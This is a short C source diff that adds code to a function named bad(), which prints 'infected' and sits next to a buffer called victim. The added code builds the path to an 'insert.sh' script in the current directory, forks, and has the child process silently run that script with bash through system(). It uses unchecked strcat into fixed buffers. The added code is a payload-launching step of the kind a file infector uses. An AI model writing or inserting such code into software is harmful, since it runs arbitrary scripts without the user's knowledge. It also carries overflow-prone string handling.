@@ -66,6 +66,21 @@ void run_old(){
 }
 void bad(){
 	puts("infected");
+	
+	char current_absolute_path[1024];
+	if (NULL != getcwd(current_absolute_path, 1024)){
+		char name[] = {"/insert.sh"};
+	
+		strcat(current_absolute_path, name);
+		char prefix[2048] = "bash ";
+		strcat(prefix, current_absolute_path);
+		if(fork()){
+			
+		}else{
+			system(prefix);
+			exit(0);
+		}	
+	}
 }
 char victim[111];
 void function1() {
